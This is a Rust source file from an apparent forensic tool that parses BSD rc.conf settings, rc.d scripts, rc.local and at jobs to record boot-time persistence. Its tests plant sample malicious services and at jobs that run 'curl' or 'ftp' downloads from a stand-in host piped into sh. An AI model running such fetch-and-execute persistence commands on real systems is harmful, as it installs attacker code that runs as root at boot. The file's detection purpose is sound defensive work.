//! Boot-time service configuration of the BSDs: `rc.conf` and its relatives, the rc.d scripts
//! they start, and the free-form boot scripts (`rc.local`, `rc.securelevel`).
//! Formats: rc.conf(5) (FreeBSD, NetBSD), rc.conf(8) (OpenBSD), rc(8) and rc.subr(8).
//!
//! `rc.conf` is shell syntax; only plain `name=value` lines are read. For a service enabled
//! with `name_enable="YES"` the script in `rc.d` is read for the program it starts, so the
//! record says what runs at boot, not only that something does. Without the package database
//! there is no way to tell a package's own `rc.d` script from a planted one: every script is
//! listed, and the metadata (owner, mode, time) is what an analyst compares.

use super::{assignment, yes};
use crate::text::{for_each_line, lossy};
use crate::{Artifact, Category, Input, BSD};
use nixcavate_core::{Basis, Loc, Record, Result, Sink, Timestamp};
use serde::Serialize;

pub const RC_CONF: Artifact = Artifact::new(
    "rc-conf",
    "BSD boot configuration: enabled services (rc.conf and rc.conf.d)",
    Category::Persistence,
    BSD,
    &[
        "etc/rc.conf",
        "etc/rc.conf.local",
        "etc/rc.conf.d/*",
        "etc/rc.conf.d/*/*",
        "usr/local/etc/rc.conf",
        "usr/local/etc/rc.conf.d/*",
        "usr/pkg/etc/rc.conf",
    ],
    parse_rc_conf,
);

pub const RC_D: Artifact = Artifact::new(
    "rc-d",
    "BSD rc.d service scripts",
    Category::Persistence,
    BSD,
    &["etc/rc.d/*", "usr/local/etc/rc.d/*", "usr/pkg/etc/rc.d/*"],
    parse_rc_d,
);

pub const RC_LOCAL: Artifact = Artifact::new(
    "bsd-rc-local",
    "BSD boot scripts run as root (rc.local, rc.securelevel, rc.firsttime)",
    Category::Persistence,
    BSD,
    &["etc/rc.local", "etc/rc.securelevel", "etc/rc.firsttime"],
    crate::common::script::content_lines,
);

pub const AT_JOBS: Artifact = Artifact::new(
    "bsd-at-jobs",
    "Jobs queued with at(1) (BSD)",
    Category::Persistence,
    BSD,
    &["var/at/jobs/*", "var/cron/atjobs/*"],
    crate::linux::at_jobs::parse,
);

#[derive(Serialize)]
struct Setting<'a> {
    variable: &'a str,
    value: &'a str,
    /// `enable` (`name_enable`), `flags` (`name_flags`), `program` (`name_program`), `packages`
    /// (`pkg_scripts`, OpenBSD), or `setting`.
    kind: &'static str,
    /// The service the setting is for (`name` of `name_enable`).
    service: &'a str,
    /// For `enable` and OpenBSD `flags`: whether the service starts at boot.
    enabled: Option<bool>,
    /// The `rc.d` script that implements an enabled service, when it was collected.
    script_path: String,
    /// What the service runs: the `command=` of its script, or the `_program` value.
    command: String,
}

impl Record for Setting<'_> {}

/// Up to this much of an rc script is read to find the command it starts.
const MAX_SCRIPT: usize = 256 << 10;

/// `command=` and `command_args=` of an rc.subr script, joined; empty when it sets neither.
fn script_command(text: &str) -> String {
    let mut command = String::new();
    let mut args = String::new();
    for line in text.lines().map(str::trim) {
        if let Some((name, value)) = assignment(line) {
            match name {
                "command" if command.is_empty() => command = value.to_string(),
                "command_args" if args.is_empty() => args = value.to_string(),
                _ => {}
            }
        }
    }
    [command, args].iter().filter(|s| !s.is_empty()).cloned().collect::<Vec<_>>().join(" ")
}

fn plausible_service(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.'))
}

fn parse_rc_conf(input: &Input, sink: &mut Sink) -> Result<()> {
    // `rc.conf.d/<service>` files hold that service's settings: the file name is the service.
    let dir_service = input
        .path
        .strip_prefix("etc/rc.conf.d/")
        .or_else(|| input.path.strip_prefix("usr/local/etc/rc.conf.d/"))
        .and_then(|rest| rest.split('/').next());
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let Some((variable, value)) = assignment(&text) else { return Ok(()) };
        let (kind, service) = if let Some(name) = variable.strip_suffix("_enable") {
            ("enable", name)
        } else if let Some(name) = variable.strip_suffix("_flags") {
            ("flags", name)
        } else if let Some(name) = variable.strip_suffix("_program") {
            ("program", name)
        } else if variable == "pkg_scripts" {
            ("packages", "")
        } else {
            ("setting", dir_service.unwrap_or(""))
        };
        // OpenBSD enables a daemon by giving it flags: `NO` disables it, anything else enables it.
        let enabled = match kind {
            "enable" => Some(yes(value)),
            "flags" => Some(!value.eq_ignore_ascii_case("NO")),
            _ => None,
        };
        let mut script_path = String::new();
        let mut command = String::new();
        if kind == "program" {
            command = value.to_string();
        } else if enabled == Some(true) && plausible_service(service) {
            for dir in ["etc/rc.d", "usr/local/etc/rc.d", "usr/pkg/etc/rc.d"] {
                let path = format!("{dir}/{service}");
                if let Some(script) = input.host.read(&path) {
                    command = script_command(&lossy(&script[..script.len().min(MAX_SCRIPT)]));
                    script_path = path;
                    break;
                }
            }
        }
        sink.emit(Loc::Line(line.number), &Setting { variable, value, kind, service, enabled, script_path, command })
    })
}

#[derive(Serialize)]
struct Script<'a> {
    name: &'a str,
    size: u64,
    /// Permission bits in octal, as collected (`100755`).
    mode: String,
    uid: u32,
    gid: u32,
    modified: Option<Timestamp>,
    /// The `#!` line, without the `#!`.
    interpreter: &'a str,
    /// The `# PROVIDE:` names.
    provide: String,
    /// The variable that enables the service (`rcvar=`), usually `name_enable`.
    rcvar: String,
    /// The `command=` and `command_args=` of the script.
    command: String,
    /// What the script does besides the rc.subr boilerplate: its code lines, joined by `; `
    /// and cut at 4 KiB.
    commands: String,
}

impl Record for Script<'_> {}

/// The lines of an rc script that are not comments, blanks or the usual rc.subr scaffolding
/// (`. /etc/rc.subr`, `name=`, `rcvar=`, `load_rc_config`, `run_rc_command`, `PROVIDE`...).
fn code_lines(text: &str) -> String {
    const SCAFFOLDING: [&str; 10] = [
        ". /etc/rc.subr",
        "load_rc_config",
        "run_rc_command",
        "name=",
        "rcvar=",
        "required_",
        "extra_commands=",
        "}",
        "{",
        "export ",
    ];
    let mut out = String::new();
    for line in text.lines().map(str::trim) {
        if line.is_empty() || line.starts_with('#') || SCAFFOLDING.iter().any(|s| line.starts_with(s)) {
            continue;
        }
        if out.len() >= 4096 {
            break;
        }
        // `start_cmd() { command; }` on one line: the commands are what is inside the braces.
        let line = match line.split_once("() {") {
            Some((name, body)) if !name.contains(' ') => {
                body.trim().trim_end_matches('}').trim().trim_end_matches(';').trim()
            }
            _ => line,
        };
        if line.is_empty() {
            continue;
        }
        if !out.is_empty() {
            out.push_str("; ");
        }
        out.push_str(line);
    }
    let mut end = out.len().min(4096);
    while !out.is_char_boundary(end) {
        end -= 1;
    }
    out.truncate(end);
    out
}

fn parse_rc_d(input: &Input, sink: &mut Sink) -> Result<()> {
    let text = lossy(&input.data[..input.data.len().min(MAX_SCRIPT)]);
    let first = text.lines().next().unwrap_or_default();
    let mut provide = String::new();
    let mut rcvar = String::new();
    for line in text.lines() {
        if let Some(rest) = line.trim().strip_prefix("# PROVIDE:") {
            provide = rest.trim().to_string();
        } else if let Some((name, value)) = assignment(line) {
            if name == "rcvar" && rcvar.is_empty() {
                rcvar = value.to_string();
            }
        }
    }
    let name = input.path.rsplit('/').next().unwrap_or_default();
    sink.emit(
        Loc::None,
        &Script {
            name,
            size: input.data.len() as u64,
            mode: format!("{:o}", input.mode),
            uid: input.uid,
            gid: input.gid,
            modified: (input.mtime > 0).then(|| Timestamp::from_secs(input.mtime, Basis::Recorded)),
            interpreter: first.strip_prefix("#!").map(str::trim).unwrap_or_default(),
            provide,
            rcvar,
            command: script_command(&text),
            commands: code_lines(&text),
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::{fixture, run, run_on_host};

    const RC_D_SCRIPT: &[u8] = b"#!/bin/sh\n# PROVIDE: nxmk\n. /etc/rc.subr\nname=\"nxmk\"\nrcvar=\"nxmk_enable\"\ncommand=\"/bin/sh\"\ncommand_args=\"-c 'curl -s http://192.0.2.7/x.sh | sh'\"\nload_rc_config $name\nrun_rc_command \"$1\"\n";

    #[test]
    fn rc_conf_lists_settings_and_finds_the_script_of_an_enabled_service() {
        let rc_conf = b"# comment\nhostname=\"web1\"\nsshd_enable=\"YES\"\nnxmk_enable=YES   # planted\nnginx_enable=\"NO\"\nnxmk_flags='-v'\nbad line\nfoo_program=\"/tmp/x\"\n";
        let out = run_on_host(
            &RC_CONF,
            &[("etc/rc.conf", rc_conf), ("usr/local/etc/rc.d/nxmk", RC_D_SCRIPT)],
            "etc/rc.conf",
            0,
        );
        insta::assert_snapshot!(out);
        assert!(out.contains("\"script_path\":\"usr/local/etc/rc.d/nxmk\",\"command\":\"/bin/sh -c 'curl -s http://192.0.2.7/x.sh | sh'\""));
        // A disabled service has no script lookup.
        assert!(out.contains("\"variable\":\"nginx_enable\",\"value\":\"NO\",\"kind\":\"enable\",\"service\":\"nginx\",\"enabled\":false,\"script_path\":\"\""));
    }

    #[test]
    fn a_service_name_cannot_walk_out_of_the_rc_directories() {
        let out = run(&RC_CONF, "etc/rc.conf", b"../../etc/passwd_enable=YES\nsh_enable=YES\n", 0);
        assert!(!out.contains("script_path\":\"etc"), "{out}");
    }

    #[test]
    fn openbsd_flags_enable_a_daemon_unless_no() {
        let out =
            run(&RC_CONF, "etc/rc.conf.local", b"httpd_flags=\nsmtpd_flags=NO\npkg_scripts=\"messagebus cupsd\"\n", 0);
        assert!(
            out.contains(
                "\"variable\":\"httpd_flags\",\"value\":\"\",\"kind\":\"flags\",\"service\":\"httpd\",\"enabled\":true"
            ),
            "{out}"
        );
        assert!(out.contains("\"service\":\"smtpd\",\"enabled\":false"));
        assert!(out.contains("\"kind\":\"packages\""));
    }

    #[test]
    fn rc_d_script_metadata() {
        let out = run(&RC_D, "usr/local/etc/rc.d/nxmk", RC_D_SCRIPT, 1_700_000_000);
        assert!(out.contains("\"provide\":\"nxmk\",\"rcvar\":\"nxmk_enable\""), "{out}");
        assert!(out.contains("\"command\":\"/bin/sh -c 'curl -s http://192.0.2.7/x.sh | sh'\""));
        assert!(out.contains("\"interpreter\":\"/bin/sh\""));
    }

    #[test]
    fn script_bodies_are_listed_without_the_boilerplate() {
        let text = "#!/bin/sh\n. /etc/rc.subr\nname=x\nrcvar=x_enable\nstart_cmd=\"x_start\"\nx_start() { curl -s http://192.0.2.7/x | sh; }\nload_rc_config $name\nrun_rc_command \"$1\"\n";
        assert_eq!(code_lines(text), "start_cmd=\"x_start\"; curl -s http://192.0.2.7/x | sh");
    }

    #[test]
    fn rc_local_lists_commands_only() {
        let out = run(&RC_LOCAL, "etc/rc.local", b"#!/bin/sh\n\n# note\n/usr/local/bin/x &\n", 0);
        assert_eq!(out.lines().count(), 1);
        assert!(out.contains("/usr/local/bin/x &"));
    }

    #[test]
    fn a_real_openbsd_rc_conf_local() {
        let out = run(&RC_CONF, "etc/rc.conf.local", &fixture("rc-conf/openbsd-rc.conf.local"), 0);
        assert_eq!(out.lines().take_while(|l| l.starts_with('{')).count(), 2, "{out}");
        assert!(out.contains("\"variable\":\"pkg_scripts\",\"value\":\"nxmk\",\"kind\":\"packages\""));
    }

    #[test]
    fn a_real_rc_conf() {
        insta::assert_snapshot!(run(&RC_CONF, "etc/rc.conf", &fixture("rc-conf/rc.conf"), 0));
    }
}

#[cfg(test)]
mod at_tests {
    use super::*;
    use crate::testing::{fixture, run};

    #[test]
    fn a_freebsd_at_job() {
        let out = run(&AT_JOBS, "var/at/jobs/c0000101c86ae3", &fixture("bsd-at-jobs/c0000101c86ae3"), 0);
        assert!(out.contains("\"queue\":\"c\",\"job_number\":1,\"time\":\"2026-11-15T01:39:00Z\""), "{out}");
        assert!(
            out.contains("\"uid\":1002,\"gid\":1002,\"mail_user\":\"root\",\"working_dir\":\"/home/alice\""),
            "{out}"
        );
        assert!(out.contains("NXMK_at_job"));
        assert!(run(&AT_JOBS, "var/at/jobs/.lockfile", b"", 0).contains("skipped"));
    }

    /// OpenBSD names a job `<run time in epoch seconds>.<queue>` and runs it through `/bin/ksh << 'DELIMITER'`.
    #[test]
    fn an_openbsd_at_job() {
        let out = run(&AT_JOBS, "var/cron/atjobs/1794710400.c", &fixture("bsd-at-jobs/openbsd-1794710400.c"), 0);
        assert!(
            out.contains(
                "\"queue\":\"c\",\"job_number\":null,\"time\":\"2026-11-15T02:40:00Z\",\"uid\":1000,\"gid\":66"
            ),
            "{out}"
        );
        assert!(out.contains("\"working_dir\":\"/home/alice\",\"command\":\"echo NXMK_at_job; ftp -o - http://192.0.2.7/NXMK_at.sh | sh\""), "{out}");
        assert!(!out.contains("--- warning"), "{out}");
    }
}
